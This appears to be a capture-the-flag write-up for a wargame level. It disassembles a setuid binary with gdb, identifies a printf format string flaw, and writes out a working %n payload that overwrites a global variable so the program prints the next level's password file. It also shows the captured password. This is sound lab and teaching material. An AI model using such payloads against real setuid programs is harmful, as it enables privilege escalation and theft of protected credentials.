# Search

```
$ ls -l
total 8
-rwsr-s---+ 1 level5 users 5252 Mar  6  2016 level4

$ ./level4 
sdfaS
sdfaS

./level4 
sdfkgjnkdfjgjksdngksdjnksgdnlkgdnskljndfgkjsdffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
sdfkgjnkdfjgjksdngksdjnksgdnlkgdnskljndfgkjsdffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
```

# Analyze with gdb

```
$ gdb level4

(gdb) disas main
   0x080484a7 <+0>:     push   %ebp
   0x080484a8 <+1>:     mov    %esp,%ebp
   0x080484aa <+3>:     and    $0xfffffff0,%esp
   0x080484ad <+6>:     call   0x8048457 <n>
   0x080484b2 <+11>:    leave  
   0x080484b3 <+12>:    ret
 <!-- there is a call to n function -->

(gdb) disas n
   0x08048457 <+0>:     push   %ebp
   0x08048458 <+1>:     mov    %esp,%ebp
   0x0804845a <+3>:     sub    $0x218,%esp
   0x08048460 <+9>:     mov    0x8049804,%eax
   0x08048465 <+14>:    mov    %eax,0x8(%esp)
   0x08048469 <+18>:    movl   $0x200,0x4(%esp)
   0x08048471 <+26>:    lea    -0x208(%ebp),%eax
   0x08048477 <+32>:    mov    %eax,(%esp)
   0x0804847a <+35>:    call   0x8048350 <fgets@plt>
   0x0804847f <+40>:    lea    -0x208(%ebp),%eax
   0x08048485 <+46>:    mov    %eax,(%esp)
   0x08048488 <+49>:    call   0x8048444 <p>
   0x0804848d <+54>:    mov    0x8049810,%eax
   0x08048492 <+59>:    cmp    $0x1025544,%eax
   0x08048497 <+64>:    jne    0x80484a5 <n+78>
   0x08048499 <+66>:    movl   $0x8048590,(%esp)
   0x080484a0 <+73>:    call   0x8048360 <system@plt>
   0x080484a5 <+78>:    leave  
   0x080484a6 <+79>:    ret
   <!-- there is a p function which look like -->

(gdb) disas p
   0x08048444 <+0>:     push   %ebp
   0x08048445 <+1>:     mov    %esp,%ebp
   0x08048447 <+3>:     sub    $0x18,%esp
   0x0804844a <+6>:     mov    0x8(%ebp),%eax
   0x0804844d <+9>:     mov    %eax,(%esp)
   0x08048450 <+12>:    call   0x8048340 <printf@plt>
   0x08048455 <+17>:    leave  
   0x08048456 <+18>:    ret
```

Main function not very interesting, just call n function\
n fucntion call fgets which is protected against buffer overflow attack\
then call p function which call printf with the return value of previous fgets\
and then compare 0x1025544 (16930116) in dec with global var m\
if the cmp match there is a call to system with argument 0x8048590 -> ("/bin/cat /home/user/level5/.pass")

so we have to use a [Format String Attack](https://owasp.org/www-community/attacks/Format_string_attack) to modify m

# how to modify the value of m

### find address of m with gdb
```
(gdb) p &m
$2 = (<data variable, no debug info> *) 0x8049810
```
### using string exploit to modify value of with %n

```
$ python -c "print('aaaa' + ' %x'*13)"| ./level4
aaaa b7ff26b0 bffff724 b7fd0ff4 0 0 bffff6e8 804848d bffff4e0 200 b7fd1ac0 b7ff37d0 61616161 20782520
```

```a = (hex)61``` in the ASCII hexa table so the buffer is at the 12th position

### Payload

we know the address of our global var m and the position of our buffer on the stack\
using %d modifier we can dinamically specify the field width ```%16930116d```
so :

```
$ python -c 'print "\x10\x98\x04\x08" + "%16930112d%12$n"' > /tmp/exploit

$ cat /tmp/exploit | ./level4
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```